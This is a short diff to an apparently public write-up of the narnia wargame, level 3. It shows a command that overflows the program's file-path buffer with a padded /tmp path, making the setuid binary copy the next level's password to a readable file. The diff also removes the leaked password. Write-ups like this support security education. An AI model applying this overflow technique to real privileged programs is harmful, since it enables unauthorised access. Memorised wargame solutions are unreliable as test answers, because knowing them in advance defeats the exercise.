@@ -52,6 +52,5 @@ with this payload gets us the password for next level.
 $ /narnia/narnia3 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/ABX
 copied contents of /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/ABX to a safer place... (/tmp/ABX)
 $ cat /tmp/ABX
-aKNxxrpDc1
+<password for next level>
 ```
-Password for Level 4: `aKNxxrpDc1`
